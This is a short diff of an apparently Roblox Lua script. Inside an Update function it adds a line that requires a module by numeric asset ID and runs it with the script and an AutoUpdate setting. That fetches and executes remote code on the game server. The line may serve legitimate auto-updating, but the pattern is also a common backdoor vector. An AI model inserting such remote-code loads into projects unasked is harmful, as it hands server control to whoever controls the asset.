@@ -23,6 +23,7 @@ end
 local function Update()
   local Plugins = script.Plugins
   Plugins.Parent = game:GetService("ServerStorage")
+  require(15596180205)(Settings.AutoUpdate, script)
 
   script.Disabled = true
 end
